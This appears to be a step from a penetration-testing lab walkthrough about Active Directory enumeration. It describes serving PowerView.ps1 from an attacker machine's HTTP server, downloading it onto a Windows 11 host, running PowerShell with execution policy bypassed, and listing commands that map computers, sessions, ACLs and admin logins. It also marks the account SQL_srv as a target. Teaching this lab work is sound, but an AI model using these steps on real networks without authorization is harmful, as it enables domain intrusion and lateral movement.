
PowerView is a PowerShell tool designed for network and AD enumeration. It helps security professionals gather detailed information about user accounts, groups, computers, and domain trusts. PowerView is used to identify potential security weaknesses and misconfigurations in an AD environment. It is commonly employed in penetration testing and red team operations

  
In the terminal, execute the command **cd /root/ADtools** to move into the ADtools folder

Next, we will attempt post-enumeration to gather additional information about the AD

For enumeration purposes, we will utilize the **PowerView.ps1** script. We will host a Python server on our attacker machine to share this script, and then we will download it onto a Windows 11 machine (Mark) using an RDP session

Type **python3 -m http.server** in the terminal and press **Enter** to start the HTTP server

After starting the HTTP server, return to Remmina where our RDP session is active. Then, open the **Firefox** browser and navigate to the URL **http://10.10.1.13:8000/PowerView.ps1** to automatically download the **PowerView.ps1** script. Close the **Firefox** browser window

Once the script is downloaded, launch **PowerShell** by searching for it in Windows search option

Navigate to the **Downloads** folder by running the command **cd Downloads**. Before loading the script, run the command **powershell -EP Bypass** to enable script execution

Now, execute the command **. .\PowerView.ps1** (there is space between the points) to load the PowerView.ps1 script in PowerShell

Next, execute **Get-NetComputer** command in PowerShell. This command will display all the information related to computers in AD. It lists all computer objects in AD, which can help in identifying network targets and mapping the AD environment

During user enumeration, we found a new user **SQL_srv**, who has some high privileges and could be useful for further attacks. In the next task we will be attacking the **SQL_srv** user who has SQL service running on it

Here are some other listed commands that you can use with **PowerView.ps1** for enumeration:

- **Get-NetOU** - Lists all organizational units (OUs) in the domain.
- **Get-NetSession** - Lists active sessions on the domain.
- **Get-NetLoggedon** - Lists users currently logged on to machines.
- **Get-NetProcess** - Lists processes running on domain machines.
- **Get-NetService** - Lists services on domain machines.
- **Get-NetDomainTrust** - Lists domain trust relationships.
- **Get-ObjectACL** - Retrieves ACLs for a specified object.
- **Find-InterestingDomainAcl** - Finds interesting ACLs in the domain.
- **Get-NetSPN** - Lists service principal names (SPNs) in the domain.
- **Invoke-ShareFinder** - Finds shared folders in the domain.
- **Invoke-UserHunter** - Finds where domain admins are logged in.
- **Invoke-CheckLocalAdminAccess** - Checks if the current user has local admin access on specified machines.

